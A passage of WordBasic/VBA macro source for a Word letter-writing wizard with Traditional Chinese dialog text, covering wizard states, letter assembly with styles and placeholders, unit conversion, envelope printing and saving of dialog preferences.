        WordBasic.OptionGroup "UseLetterhead"
            WordBasic.OptionButton 298, 68, 189, 16, "含標頭的信件(&L)", "LetterHeadYes"
            WordBasic.OptionButton 298, 88, 189, 16, "不含標頭的信件(&P)", "LetterHeadNo"
        ItemsInState 4

    'State 4
        WordBasic.Text 267, 7, 273, 17, "您要將信件標頭設計放在頁面何處?"
        WordBasic.OptionGroup "LetterHeadPosition"
            WordBasic.OptionButton 285, 30, 104, 16, "靠上(&T)", "AtTheTop"
            WordBasic.OptionButton 285, 50, 109, 16, "靠左(&L)", "OnTheLeft"
            WordBasic.OptionButton 285, 70, 119, 16, "靠右(&R)", "OnTheRight"
        WordBasic.Text 267, 107, 262, 17, "信件標頭設計需要多大的間距(&S)?"
        WordBasic.TextBox 286, 125, 65, 18, "textLetterheadSpace"
        WordBasic.Text 261, 172, 40, 13, kTip$, "tip5"
        WordBasic.Text 306, 172, 220, 39, " ", "tip5text"
        ItemsInState 9

    'State 5
        WordBasic.Text 265, 9, 280, 12, "輸入收信人資料或由通訊錄中選取(&T):"
        WordBasic.TextBox 265, 46, 258, 67, "textRecipientAddress", 1
        WordBasic.Text 265, 115, 115, 12, "寄信人地址(&Y):"
        WordBasic.TextBox 265, 152, 258, 56, "textReturnAddress", 1
        WordBasic.PushButton 398, 24, 127, 21, "通訊錄(&A)...", "Push1" '43
        WordBasic.PushButton 398, 129, 127, 21, "通訊錄(&X)...", "Push2" '44
        ItemsInState 6
        
    'State 6
        WordBasic.Text 258, 42, 300, 17, "您想選用何種樣式?"
        WordBasic.OptionGroup "WizStyle"
            WordBasic.OptionButton 278, 65, 200, 16, "古典式(&C)"
            WordBasic.OptionButton 278, 85, 200, 16, "現代式(&O)"
            WordBasic.OptionButton 278, 105, 200, 16, "標準式(&T)"
        ItemsInState 5

    'State 7: Finish
        WordBasic.Picture 0, 0, 269, 215, "FlagPic", 1, "flag"
        WordBasic.Text 277, 60, 237, 20, "精靈已完成建立信件的詢問選項!"
        WordBasic.Text 289, 103, 212, 15, "信件建立之後您還想做什麼?"
        WordBasic.OptionGroup "HelpOrEnvelope"
            WordBasic.OptionButton 308, 126, 222, 14, "建立信封或郵寄標籤(&C)"
            WordBasic.OptionButton 308, 146, 222, 16, "只要顯示信件即可(&J)"
        ItemsInState 6 'Number of items in state
        HideFilePreview__(LastState) = 1
    WordBasic.EndDialog
Set dlg = WordBasic.CurValues.UserDialog
    
    ' Set some default values
    WordBasic.CurValues.ToolsOptionsUserInfo toui
    gEnvelopeLabel = 0

    'We're ready (finally!) to throw the wizard onto the screen:
    If WordBasic.Dialog.UserDialog(dlg) = 0 Then
        WordBasic.WaitCursor 1
        WordBasic.ToolsOptionsGeneral BlueScreen:=gDoogie
        WordBasic.WindowList (iWorkDoc) 'ensure work doc is in front for tests
        If WordBasic.Window() <> iWorkDoc Then Exit Sub
        WordBasic.DocClose 2 'Close the document(w/out saving)
        If WordBasic.[WindowName$]() <> emptyDoc$ Then Exit Sub
        WordBasic.DocClose 2 'Close the empty doc
    Else
        WordBasic.WaitCursor 1
        WordBasic.ToolsOptionsGeneral BlueScreen:=gDoogie
        WordBasic.WindowList (iWorkDoc) 'ensure work doc is in front
        WordBasic.ScreenUpdating -1
        If gEnvelopeLabel Then
            If WordBasic.ExistingBookmark("recipAddr") <> 0 Then WordBasic.WW7_EditGoTo "recipAddr"
            dlgEL.ExtractAddress = 0
            x = WordBasic.Dialog.ToolsEnvelopesAndLabels(dlgEL) 'we already setup dlgEL (see below)
            If dlgEL.AddrText = "" Then
                faddr = dlgEL.EnvAddress
            Else
                faddr = dlgEL.AddrText
            End If
            If dlgEL.RetAddrText = "" Then
                freaddr = dlgEL.EnvReturn
            Else
                freaddr = dlgEL.RetAddrText
            End If
            Select Case x
                Case 1
                    If dlgEL.Tab <> "0" Then
                        Application.MailingLabel.DefaultPrintBarCode = False
                        Application.MailingLabel.PrintOut Address:=faddr
                    Else
                        ActiveDocument.Envelope.PrintOut ExtractAddress:=dlgEL.ExtractAddress, Address:=faddr, returnAddress:=freaddr
                    End If
                    ' need to print a document
                Case 2
                    If dlgEL.Tab <> "0" Then
                        Application.MailingLabel.DefaultPrintBarCode = False
                        Application.MailingLabel.CreateNewDocument Address:=faddr
                    Else
                        ActiveDocument.Envelope.Insert ExtractAddress:=dlgEL.ExtractAddress, Address:=faddr, returnAddress:=freaddr
                    End If
                    ' need to do a WindowList(iWorkDoc) here..
                Case Else
                    'do nothing
            End Select
            If WordBasic.ExistingBookmark("letterbody") <> 0 Then
                WordBasic.WW7_EditGoTo "letterbody"
                WordBasic.LineDown 1, 1
            End If
        End If
        WordBasic.FileTemplates Store:=0, Template:=Normal_$, LinkStyles:=0
        'WindowNumber changes when user selects Envelops and Labels since in some languages it is opened as "address" and comes before empty doc.
        iWindowNumber = 1
        While (iWindowNumber <= WordBasic.CountWindows())
            If (WordBasic.[WindowName$](iWindowNumber) = emptyDoc$) Then
                WordBasic.WindowList (iWindowNumber)
                WordBasic.DocClose 2
            End If
            iWindowNumber = iWindowNumber + 1
        Wend
        
    End If
    'All done!
    WordBasic.ScreenUpdating -1
    
End Sub '%% StartWizard

'======================================================
'%% Wizard-specific routines

Private Sub GetPrewrittenDetails()
Dim def$
Dim path$
Dim i
    WordBasic.PrintStatusBar kLookingForLetters$
    def$ = WordBasic.[GetDocumentVar$]("LetterName")
    defLttr = -1
    path$ = xFetchPref$(kLetterPath$) 'Has this been defined in wordwiz.ini??
    If path$ = "" Then path$ = WordBasic.[GetProfileString$](kLetterPath$) '..How about in win.ini/winword6.ini?
    If path$ = "" Then 'No, so assume they're in subdir of program directory
        path$ = WordBasic.[DefaultDir$](9) 'get program directory

        If path$ <> "" Then
            If WordBasic.[Right$](path$, 1) <> "\" Then path$ = path$ + "\"
            path$ = path$ + kLettersDir$        'letters subdirectory
            If WordBasic.[Files$](path$ + "*.*") = "" Then path$ = WordBasic.[Left$](path$, Len(path$) - 8)
        Else
            path$ = WordBasic.[Files$](".")         'this is the best we can do
        End If
    End If
    If WordBasic.[Right$](path$, 1) <> "\" Then path$ = path$ + "\"
    LettersPath$ = path$
    WordBasic.PrintStatusBar kLoadingLetterDetails$
LExit:
End Sub

Private Function GetDefaultUnits()
    Dim dlgTO As Object: Set dlgTO = WordBasic.DialogRecord.ToolsOptionsGeneral(False)
    WordBasic.CurValues.ToolsOptionsGeneral dlgTO
    GetDefaultUnits = dlgTO.Units
End Function

Private Function UnitName$(unit)
    Select Case unit
        Case 0
            UnitName$ = "英吋"
        Case 1
            UnitName$ = "公分"
        Case 2
            UnitName$ = "點數"
        Case 3
            UnitName$ = "pi"
        Case Else
            UnitName$ = ""
            WordBasic.PrintStatusBar "Unknown units!" 'debug only
    End Select
End Function

Private Function ConvertInchesToUnits(oldVal, newUnits)
Dim newVal
    Select Case newUnits
        Case 0: 'inches
            newVal = oldVal
        Case 1: 'cm
            newVal = oldVal * 2.54
        Case 2: 'pts
            newVal = oldVal * 72
        Case 3: 'pi
            newVal = oldVal * 6
        Case Else
            newVal = oldVal
            WordBasic.PrintStatusBar "Unknown units!"
    End Select
    ConvertInchesToUnits = newVal
End Function

Private Function ConvertUnitsToInches(oldVal, oldUnits)
Dim newVal
    Select Case oldUnits
        Case 0:     'inches
            newVal = oldVal
        Case 1:   'cm
            newVal = oldVal / 2.54
        Case 2: 'pts
            newVal = oldVal / 72
        Case 3: 'pi
            newVal = oldVal / 6
        Case Else
            newVal = oldVal
            WordBasic.PrintStatusBar "Unknown units!"
    End Select
    ConvertUnitsToInches = newVal
End Function

Private Function PrettyMeasurement$(theVal, theUnits)
Dim v
Dim u$
    If (theVal < 11) Then v = WordBasic.Int(theVal * 2 + 0.5) / 2 Else v = WordBasic.Int(theVal)
    u$ = UnitName$(theUnits)
    If theUnits > 0 Then u$ = " " + u$
    PrettyMeasurement$ = WordBasic.[LTrim$](Str(v)) + u$
End Function
        
Rem This function assumes input is in inches
Private Function RightDistanceToLeftDistance$(fromEdgeInches)
Dim fromEdgeDef
    Dim dlgPg As Object: Set dlgPg = WordBasic.DialogRecord.FilePageSetup(False)
    WordBasic.CurValues.FilePageSetup dlgPg
    fromEdgeDef = ConvertInchesToUnits(fromEdgeInches, GetDefaultUnits)
    RightDistanceToLeftDistance$ = Str(WordBasic.Val(dlgPg.PageWidth) - WordBasic.Val(dlgPg.LeftMargin) - WordBasic.Val(dlgPg.RightMargin) - fromEdgeDef)
End Function

Private Sub InsertRedSlot(s$)   'DAPFEL, Changed to a MacroButton
                        'MUST HAVE EmptyMacro macro in .wiz template
    WordBasic.ToolsOptionsView FieldCodes:=1
    WordBasic.InsertField Field:=kMacroButton$
    WordBasic.CharLeft 1
    WordBasic.Insert kEmptyMacro$
    WordBasic.Insert "["
    WordBasic.Insert s$
    WordBasic.Insert "]"
    WordBasic.CharRight 1
    WordBasic.ToolsOptionsView FieldCodes:=0
End Sub

Private Sub SubstituteBananas()
Dim v$
Dim letterIndex
Dim ii
    DoStyleMerge
    If WordBasic.ExistingBookmark("bkAddress") Then
        WordBasic.EditBookmark Name:="bkAddress", GoTo:=1
'If recipient address is same as default address(AT entry) then insert boilerplates
        v$ = WordBasic.[DlgText$]("textRecipientAddress")
        If v$ <> kAddressATEntry$ Then
            If v$ <> "" Then
                WordBasic.Insert v$
            Else
                WordBasic.EditClear 'not able to replace selected text with empty string. Text remains unchanged.
            End If
        Else
            InsertRedSlot kRecipient$
            WordBasic.InsertPara
            InsertRedSlot kEnterRecipientAddress$
        End If
    End If

    If WordBasic.ExistingBookmark("Date") Then
        WordBasic.EditBookmark Name:="Date", GoTo:=1
        WordBasic.InsertDateTime kFormalDateFormat$
    End If
    If WordBasic.ExistingBookmark("bkReturnAddress") Then
        WordBasic.EditBookmark Name:="bkReturnAddress", GoTo:=1
        WordBasic.WW6_EditClear
        If WordBasic.DlgValue("UseLetterhead") = 1 Then
            WordBasic.EditBookmark "bkReturnAddress" 'Plain Paper
        Else
            WordBasic.WW6_EditClear 'Remove Paragraph mark
        End If
    End If
    
    If WordBasic.ExistingBookmark("bkCompany") Then
        WordBasic.EditBookmark Name:="bkCompany", GoTo:=1
        WordBasic.WW6_EditClear

        If WordBasic.DlgValue("UseLetterhead") = 1 Then
            WordBasic.EditBookmark "bkCompany" 'Plain Paper
        Else
            WordBasic.WW6_EditClear 'Remove Paragraph mark
        End If
    End If

    If WordBasic.DlgValue("UseLetterhead") = 1 Then
        If WordBasic.ExistingBookmark("bkCompany") Then
            WordBasic.Style kStyCmpnyName$
            WordBasic.EditBookmark Name:="bkCompany", GoTo:=1
            InsertRedSlot kTypeCompanyName$
        End If
        If (WordBasic.DlgValue("WizStyle") = 1) Then
            WordBasic.WW7_EditAutoText Name:="cntmpgfx2", Insert:=1
        'An extra line is introduced with the insertion of AT Entry. Does not affect Resume cover letter and letter to mom, because you do not have "Company Name" style
            WordBasic.CharRight 1, 1
            WordBasic.WW6_EditClear
        Else
            WordBasic.InsertPara
        End If 'Wizstyle=1
        
        WordBasic.EditBookmark Name:="bkReturnAddress", GoTo:=1
        WordBasic.Style kStyRetAddr$
        ParseRetAddress
        If (WordBasic.DlgValue("WizStyle") <> 2) Then ' Cntmp or Prof let style
            For ii = 0 To 3
                If (RetAddress__$(ii) <> "") Then
                    WordBasic.Insert RetAddress__$(ii) + Chr(13)
                Else
                    WordBasic.Insert Chr(13)
                End If 'RetAddress...
            Next ii
            If RetAddress__$(4) <> "" Then WordBasic.Insert RetAddress__$(4)
        Else 'elegant style
            For ii = 0 To 3
                If (RetAddress__$(ii) <> "") Then
                    WordBasic.Insert RetAddress__$(ii) + " ‧ "
                Else
                    'Do Nothing
                End If 'RetAddress...
            Next ii
            If RetAddress__$(4) <> "" Then
                WordBasic.Insert RetAddress__$(4)
            Else
                WordBasic.WW6_EditClear -3 'get rid of last bullet
            End If
        End If
    End If 'LetterHead

    If WordBasic.ExistingBookmark("bkName") Then
        WordBasic.EditBookmark Name:="bkName", GoTo:=1
        InsertRedSlot kName$
    End If

    If WordBasic.ExistingBookmark("bkName2") Then
        WordBasic.EditBookmark Name:="bkName2", GoTo:=1
        If toui.Name <> "" Then
            WordBasic.Insert toui.Name
        Else
            InsertRedSlot kName$
        End If
    End If
LDone:
End Sub





Private Sub SetAddress(nm)
Dim AddressText$
Dim ix
Dim iy
Dim Ltemp$
Dim Rtemp$
    On Error GoTo -1: On Error GoTo ErrorSetAddress
    AddressText$ = WordBasic.[GetAddress$]("", "", 0, 1, 0, 0, (nm - 1), 1)
    If AddressText$ = "" Then GoTo SetAddressContinue
    ix = InStr(1, AddressText$, Chr(11))
    While ix <> 0
        iy = Len(AddressText$)
        Ltemp$ = WordBasic.[Left$](AddressText$, (ix - 1))
        Rtemp$ = WordBasic.[Right$](AddressText$, (iy - ix))
        AddressText$ = Ltemp$ + Chr(13) + Rtemp$
        ix = InStr(1, AddressText$, Chr(11))
    Wend
    iy = Len(AddressText$)
    ix = InStr(iy, AddressText$, Chr(13))
    While ix = iy
        AddressText$ = WordBasic.[Left$](AddressText$, (iy - 1))
        iy = Len(AddressText$)
        ix = InStr(iy, AddressText$, Chr(13))
    Wend
    If nm = 1 Then
        WordBasic.DlgText "textRecipientAddress", AddressText$
    ElseIf nm = 2 Then
        WordBasic.DlgText "textReturnAddress", AddressText$
    Else
        'shouldn't happen
    End If 'nm
    GoTo SetAddressContinue
ErrorSetAddress:
    'Only after getting the first MAPI load error, CommandValid ("InsertAddress") returns 0
    If nm = 1 Then 'If error is due to MAPI loading, disable buttons
        WordBasic.DlgFocus 43
        WordBasic.DlgEnable 46, 0 - WordBasic.CommandValid(kInsertAddress$)
        WordBasic.DlgEnable 47, 0 - WordBasic.CommandValid(kInsertAddress$)
    Else
        WordBasic.DlgFocus 45
        WordBasic.DlgEnable 47, 0 - WordBasic.CommandValid(kInsertAddress$)
        WordBasic.DlgEnable 46, 0 - WordBasic.CommandValid(kInsertAddress$)
    End If
    On Error GoTo -1: On Error GoTo 0
SetAddressContinue:
End Sub 'SetAddress

Private Function RmTrailingLFs$(tString$) 'nukes extra returns in a string
Dim iy
Dim ix
    iy = Len(tString$)
    If iy = 0 Then GoTo EndOfRmTrailingLFs
    ix = InStr(iy, tString$, Chr(13))
    While ix = iy
        tString$ = WordBasic.[Left$](tString$, (iy - 1))
        iy = Len(tString$)
        ix = InStr(iy, tString$, Chr(13))
    Wend
EndOfRmTrailingLFs:
    RmTrailingLFs$ = tString$
End Function

Private Sub TwoPageHack(num) 'Hacks in a 2nd page header/footer
    WordBasic.WW7_InsertPageBreak
    WordBasic.EndOfDocument
    WordBasic.FilePageSetup DifferentFirstPage:=1
    If num = 1 Then
        WordBasic.ViewHeader
        If (WordBasic.DlgValue("WizStyle") <> 2) Then
            WordBasic.Insert Chr(9) + Chr(9)
        Else
            WordBasic.Insert Chr(9)
        End If
        WordBasic.InsertDateTime kFormalDateFormat$
        WordBasic.ViewNormal
    End If
    If num = 2 Then
        WordBasic.ViewFooter
        If (WordBasic.DlgValue("WizStyle") <> 2) Then
            WordBasic.Insert Chr(9) + Chr(9)
            WordBasic.InsertPageField
        Else
            WordBasic.Insert Chr(9)
            WordBasic.Insert Chr(150) + " "
            WordBasic.InsertPageField
            WordBasic.Insert " " + Chr(150)
        End If
        WordBasic.ViewNormal
    End If
    WordBasic.EditSelectAll
    WordBasic.WW6_EditClear
End Sub

Private Sub CreateLetter()
Dim recpAddress$
Dim returnAddress$
Dim T$
Dim DateTabPlace$
Dim ii
    WordBasic.PrintStatusBar kCreatingDoc$
    WordBasic.WaitCursor 1
    ' branch on letter type : shrinkwrapped or original
    recpAddress$ = WordBasic.[DlgText$]("textRecipientAddress")
    If (recpAddress$ <> "") Then WordBasic.DlgText "textRecipientAddress", RmTrailingLFs$(recpAddress$)
    returnAddress$ = WordBasic.[DlgText$]("textReturnAddress")
    If (returnAddress$ <> "") Then WordBasic.DlgText "textReturnAddress", RmTrailingLFs$(returnAddress$)

Rem ****************************************************

    If WordBasic.DlgValue("chkloDate") <> 0 Then
        TwoPageHack (1) 'Hacks in a 2nd page header/footer
    End If
    If WordBasic.DlgValue("chkloPage") <> 0 Then
        TwoPageHack (2)
        WordBasic.ViewFooter
        Select Case WordBasic.DlgValue("WizStyle")
            Case 2
                WordBasic.Insert Chr(9)
                WordBasic.Insert Chr(150) + " "
                WordBasic.InsertPageField
                WordBasic.Insert " " + Chr(150)
            Case 1
                WordBasic.Insert Chr(9) + Chr(9)
                WordBasic.InsertPageField
            Case 0
                WordBasic.Font kFntWndngs$
                WordBasic.Insert kDfltPageNum$
                WordBasic.Font kFntArial$
                WordBasic.Insert kPage$
                WordBasic.InsertPageField
        End Select
        WordBasic.ViewNormal
    End If
    If (WordBasic.DlgValue("WizStyle") = 1) And (WordBasic.DlgValue("chkloPage") = 0) Then
        WordBasic.ViewFooter
        WordBasic.Insert " "
        WordBasic.ViewNormal
    End If
    ' this is code for original letters
    WordBasic.EditSelectAll
    WordBasic.WW6_EditClear
    If WordBasic.DlgValue("UseLetterhead") = 0 Then
        T$ = WordBasic.[DlgText$]("textLetterheadSpace")
        On Error GoTo -1: On Error GoTo LBadMeasurement
        Select Case WordBasic.DlgValue("LetterHeadPosition")
            Case 0  ' at the top
                WordBasic.FilePageSetup TopMargin:=T$
            Case 1    ' on the left
                WordBasic.FilePageSetup LeftMargin:=T$
            Case 2  ' on the right
                WordBasic.FilePageSetup RightMargin:=T$
        End Select
        GoTo LDoneLetterhead
LBadMeasurement:
        WordBasic.DlgFilePreview emptyDoc$
        WordBasic.DocClose 2 'Close the working document(w/out saving)
        Stop
LDoneLetterhead:
        On Error GoTo -1: On Error GoTo 0
    End If
    WordBasic.InsertPara
'Hey, this would be a good time to figure out where the return address/date should go:
    DateTabPlace$ = RightDistanceToLeftDistance$(rtDistToLftDist) '1.25" from the right is what?
    'InsertPara'we're starting *after* return address/date (if included)
    If WordBasic.DlgValue(11) <> 1 Then 'it's not a personal letter
        WordBasic.EditBookmark "recipaddr", Add:=1
        WordBasic.Style kStyInsideAddr$
        WordBasic.Insert WordBasic.[DlgText$]("textRecipientAddress") 'includes name
        WordBasic.InsertPara
    'InsertPara  DAPFEL removed
    End If
    WordBasic.Style kStySal$
    WordBasic.Insert kDear$ '+ DlgText$("textRecipientName")
    WordBasic.EditBookmark "recipient", Add:=1
    InsertRedSlot kRecipient$
    'lenrecip = Len(kRecipient$) + 2    ' 2 for [, ]
    If WordBasic.DlgValue(11) = 1 Then WordBasic.Insert "," Else WordBasic.Insert ":"
    WordBasic.InsertPara
    If WordBasic.DlgValue("chkloID") And (WordBasic.DlgValue(11) <> 1) Then
        WordBasic.Style kStySubjLine$
        WordBasic.Insert kRE$
        InsertRedSlot kAccountID$
        WordBasic.InsertPara
    End If
    WordBasic.Style kStyBodyText$
    WordBasic.EditBookmark "letterbody", Add:=1
    InsertRedSlot kTypeHere$
    WordBasic.InsertPara
    WordBasic.FormatTabs ClearAll:=1
    WordBasic.FormatTabs Position:=DateTabPlace$, Set:=1
    WordBasic.Style "結語"
    If WordBasic.DlgValue(11) = 1 Then WordBasic.Insert kClosePersonal$ Else WordBasic.Insert kCloseBusiness$
    WordBasic.InsertPara    'space for writer's name
    If WordBasic.DlgValue(11) <> 1 Then 'if not personal
        WordBasic.InsertPara
        WordBasic.Style kStyRefIntls$
        If WordBasic.DlgValue("chkloWriterInitials") Then
            InsertRedSlot kWritersInitials$
            If WordBasic.DlgValue("chkloTypistInitials") Then WordBasic.Insert "/" Else WordBasic.InsertPara
        End If
        If WordBasic.DlgValue("chkloTypistInitials") Then
            InsertRedSlot kTypistsInitials$
            WordBasic.InsertPara
        End If
        If WordBasic.DlgValue("chkloCC") Then
            WordBasic.Style kStyCC$
            WordBasic.Insert kCC$
            InsertRedSlot kNames$
            WordBasic.InsertPara
        End If
        WordBasic.Style kStyEncl$
        If WordBasic.DlgValue("chkloEnclosures") Then
            WordBasic.Insert kEnclosures$
            InsertRedSlot kNumber$
            WordBasic.InsertPara
        End If
        If WordBasic.DlgValue("chkloAttachments") Then
            WordBasic.Insert kAttachments$ + Chr(13)
        End If
    End If 'not personal
    WordBasic.StartOfDocument  ' go back to the start
    If WordBasic.DlgValue("LetterMethod") = 1 Then 'Personal
        If WordBasic.DlgValue("WizStyle") = 1 Then 'Contemporary Style
            WordBasic.WW7_EditAutoText Name:="cntmpgfx2", Insert:=1
            WordBasic.StartOfDocument
        End If 'Contemporary Style
    Else 'if not personal
        If WordBasic.DlgValue("UseLetterhead") = 1 Then
            WordBasic.Style kStyCmpnyName$
            InsertRedSlot kTypeCompanyName$
            If (WordBasic.DlgValue("WizStyle") = 1) Then
                WordBasic.WW7_EditAutoText Name:="cntmpgfx2", Insert:=1
                WordBasic.Style kStyCmpnyName$
            Else
                WordBasic.InsertPara
            End If 'Wizstyle=1
            WordBasic.Style kStyRetAddr$
            ParseRetAddress
            If (WordBasic.DlgValue("WizStyle") <> 2) Then ' Cntmp or Prof let style
                For ii = 0 To 3
                    If (RetAddress__$(ii) <> "") Then
                        WordBasic.Insert RetAddress__$(ii) + Chr(13)
                    Else
                        WordBasic.Insert Chr(13)
                    End If 'RetAddress...
                Next ii
                If RetAddress__$(4) <> "" Then WordBasic.Insert RetAddress__$(4)
            Else 'elegant style
                For ii = 0 To 3
                    If (RetAddress__$(ii) <> "") Then
                        WordBasic.Insert RetAddress__$(ii) + " ‧ "
                    Else
                        'Do Nothing
                    End If 'RetAddress...
                Next ii
                If RetAddress__$(4) <> "" Then
                    WordBasic.Insert RetAddress__$(4)
                Else
                    WordBasic.WW6_EditClear -3 'get rid of last bullet
                End If
            End If
        End If 'LetterHead
    End If 'NotPersonal
    If WordBasic.DlgValue("chkloDate") = 1 Then
        WordBasic.Insert Chr(13)
        WordBasic.Style kStyDate$
        WordBasic.InsertDateTime kFormalDateFormat$
    End If
LPrewrittenContinue:
    WordBasic.StartOfDocument
    WordBasic.ViewPage
    WordBasic.ViewZoom AutoFit:=1
    If WordBasic.DlgValue(11) = 0 Then WordBasic.CharRight 1, 1 'select Company Name
End Sub

Private Sub PickStylePreview()
    WordBasic.StartOfDocument
    WordBasic.EditSelectAll
    WordBasic.WW6_EditClear
    DoStyleMerge
    Select Case WordBasic.DlgValue("WizStyle")
        Case 0
            WordBasic.WW7_EditAutoText kGallery$, Insert:=1
        Case 1
            If WordBasic.DlgValue("UseLetterhead") = 1 Then
                WordBasic.WW7_EditAutoText Name:="cntmpgfx2", Insert:=1
                WordBasic.StartOfDocument
            End If
            WordBasic.WW7_EditAutoText kGallery$, Insert:=1
        Case 2
            WordBasic.WW7_EditAutoText kGallery$, Insert:=1
    End Select
End Sub

Private Sub DoStyleMerge()
Dim n$
    n$ = ""
    Select Case WordBasic.DlgValue("WizStyle")
        Case 0
            n$ = proflett$
            WordBasic.FilePageSetup FooterDistance:=kFtrDist1$ + Chr(34)
        Case 1
            n$ = cntmplet$
            WordBasic.FilePageSetup FooterDistance:=kFtrDist2$ + Chr(34)
        Case 2
            n$ = eleglett$
            WordBasic.FilePageSetup FooterDistance:=kFtrDist1$ + Chr(34)
    End Select
    WordBasic.WaitCursor 1
    On Error GoTo -1: On Error GoTo LStyleMissing
    WordBasic.FormatStyleGallery Template:=n$
    WordBasic.DlgUpdateFilePreview
    GoTo LContinue1
LStyleMissing:
    WordBasic.MsgBox kErrStyleNotFound1$ + n$ + kErrStyleNotFound2$, wizname$, 48
LContinue1:
    On Error GoTo -1: On Error GoTo 0
    WordBasic.WaitCursor 0
End Sub

Private Sub ParseRetAddress()
Dim i
Dim temp$
Dim iPos
    For i = 0 To 7
        RetAddress__$(i) = ""
    Next
    i = 0
    temp$ = WordBasic.[DlgText$]("textReturnAddress")
    If temp$ <> "" Then
        iPos = InStr(temp$, Chr(13))
        While iPos And (i < 7)
            If iPos < Len(temp$) Then
                RetAddress__$(i) = WordBasic.[Left$](temp$, iPos - 1)
                temp$ = Mid(temp$, iPos + 1)
                iPos = InStr(temp$, Chr(13))
                i = i + 1
            Else
                If Len(temp$) > 1 Then
                    RetAddress__$(i) = WordBasic.[Left$](temp$, iPos - 1)
                    i = i + 1
                End If
                temp$ = ""
                iPos = 0
            End If
        Wend
        If temp$ <> "" Then
            RetAddress__$(i) = temp$
            i = i + 1
        End If
    End If

    RetAddressLines = i
End Sub


'%% NextState : Determine the next state
Private Function NextState(oldState)    'Determine state that follows oldState
Dim LetterMethod
Dim UseLetterhead
    LetterMethod = WordBasic.DlgValue(11)
    UseLetterhead = WordBasic.DlgValue("UseLetterhead")
    If oldState = 3 And UseLetterhead <> 0 And LetterMethod = 1 Then
        NextState = oldState + 3
    ElseIf oldState = 3 And UseLetterhead <> 0 Then
        NextState = oldState + 2
    ElseIf oldState = 4 And LetterMethod = 1 Then
        NextState = oldState + 2
    Else
        NextState = oldState + 1 'default
    End If
End Function 'NextState

'%% PrevState : Determine the preceding state
Private Function PrevState(oldState)
Dim LetterMethod
Dim UseLetterhead
    LetterMethod = WordBasic.DlgValue(11)
    UseLetterhead = WordBasic.DlgValue("UseLetterhead")
    If oldState = 6 And LetterMethod = 1 And UseLetterhead <> 0 Then
        PrevState = oldState - 3
    ElseIf oldState = 6 And LetterMethod = 1 Then
        PrevState = oldState - 2
    ElseIf oldState = 5 And UseLetterhead <> 0 Then
        PrevState = oldState - 2
    Else
        PrevState = oldState - 1 'Default
    End If
End Function 'PrevState

Private Sub UpdateHeadingPosition()
Dim lhpNew
Dim L$
Dim R$
Dim T$
    lhpNew = WordBasic.DlgValue("LetterHeadPosition")
    If lhpNew <> gCurrentHeadingPosition Then
        WordBasic.WaitCursor 1
        gCurrentHeadingPosition = lhpNew
        L$ = pt90_$: R$ = pt90_$: T$ = pt72_$
        Select Case gCurrentHeadingPosition
            Case 0: T$ = pt216_$
            Case 1: L$ = pt216_$
            Case 2: R$ = pt216_$
        End Select
        WordBasic.FilePageSetup TopMargin:=T$, LeftMargin:=L$, RightMargin:=R$
    PickStylePreview
    End If
End Sub

'%% DoButtonClick : Handle custom buttons (override standard buttons if necessary)
Private Function DoButtonClick(id$, item)
Dim ret
Dim letterIndex
Dim fname$
Dim x
    ret = 0 'Change value of ret when we override standard buttons (eg, "Next")
    'Note: item 6 is "Next>"
    
    If State = 3 And item > StateItems__(0) Then
        If WordBasic.DlgValue("UseLetterhead") = 0 Then
            gCurrentHeadingPosition = -69 'force change
            UpdateHeadingPosition
        Else
            WordBasic.FilePageSetup TopMargin:=pt72_$, LeftMargin:=pt90_$, RightMargin:=pt90_$
            PickStylePreview 'TEST
        End If
        WordBasic.DlgUpdateFilePreview
    End If
    If State = 4 And item > StateItems__(0) Then
        If WordBasic.DlgValue("LetterHeadPosition") <> gCurrentHeadingPosition Then
            UpdateHeadingPosition
            WordBasic.DlgUpdateFilePreview
        End If
    End If
    If State = 5 Then
        ParseRetAddress
        If RetAddressLines > 5 Then
            ret = 2
            WordBasic.DlgFocus "textReturnAddress"
            WordBasic.MsgBox kErrMaxLines$, 48
        End If 'retaddress...
    End If 'state = 5
    If State = 6 And item > StateItems__(0) Then
        PickStylePreview
        WordBasic.DlgUpdateFilePreview
    End If
LContinue:
    If item = 7 Then ' FINISH
        If RetAddressLines <= 5 Then
            CreateLetter
            x = WordBasic.DlgValue("HelpOrEnvelope")
            gEnvelopeLabel = (x = 0)
            WordBasic.CurValues.ToolsEnvelopesAndLabels dlgEL
            dlgEL.EnvAddress = WordBasic.[DlgText$]("textRecipientAddress")
            dlgEL.EnvReturn = WordBasic.[DlgText$]("textReturnAddress")
            dlgEL.AddrText = WordBasic.[DlgText$]("textRecipientAddress")
            dlgEL.ExtractAddress = 0
            ret = 1 ' This means "return from wizard now"
        Else
            ret = 2
        End If
    End If
    DoButtonClick = ret
End Function 'DoButtonClick


Private Sub ItemFocusChanged(id$, wold)
    If State = 1 Then
       If WordBasic.[Left$](id$, 5) = "optlm" Then
        WordBasic.DlgText "tip1text", WordBasic.[GetAutoText$]("tip1" + id$, 1)
       End If
    ElseIf State = 4 Then
       If Mid(id$, 3, 3) = "The" Then
        WordBasic.DlgText "tip5text", WordBasic.[GetAutoText$]("tip5" + id$, 1)
       End If
    End If
End Sub

Private Sub SaveDialog()
    WordBasic.PrintStatusBar kSaveSettings$
    SaveDlgValPref "LetterMethod"
'state 2
    SaveDlgValPref "chkloPage"
    SaveDlgValPref "chkloDate"
    SaveDlgValPref "chkloID"
    SaveDlgValPref "chkloWriterInitials"
    SaveDlgValPref "chkloTypistInitials"
    SaveDlgValPref "chkloCC"
    SaveDlgValPref "chkloEnclosures"
    SaveDlgValPref "chkloAttachments"
'3
    SaveDlgValPref "UseLetterhead"
'4
    SaveDlgValPref "LetterHeadPosition"
    SaveDlgPref "textLetterheadSpace"
'5
    SaveDlgMultiLinePref "textRecipientAddress"
    SaveDlgMultiLinePref "textReturnAddress"
'6
    SaveDlgValPref "WizStyle"
'finish
    SaveDlgValPref "HelpOrEnvelope"
End Sub

Private Sub RstDialog()
Dim a$
Dim unit
Dim kRstStylesheet$
Dim def$
    WordBasic.PrintStatusBar kRstSettings$
    RstDlgValPref "LetterMethod", 0 ' LetterMethod is id #11
    WordBasic.DlgText "tip1text", WordBasic.[GetAutoText$]("tip1optlm" + WordBasic.[LTrim$](Str(WordBasic.DlgValue(11) + 1)), 1) 'For Prewritten Letters
'state 2
    RstDlgValPref "chkloPage", 1
    RstDlgValPref "chkloDate", 1
    RstDlgValPref "chkloID", 0
    RstDlgValPref "chkloWriterInitials", 0
    RstDlgValPref "chkloTypistInitials", 0
    RstDlgValPref "chkloCC", 0
    RstDlgValPref "chkloEnclosures", 0
    RstDlgValPref "chkloAttachments", 0
'3
    RstDlgValPref "UseLetterhead", 1
'4
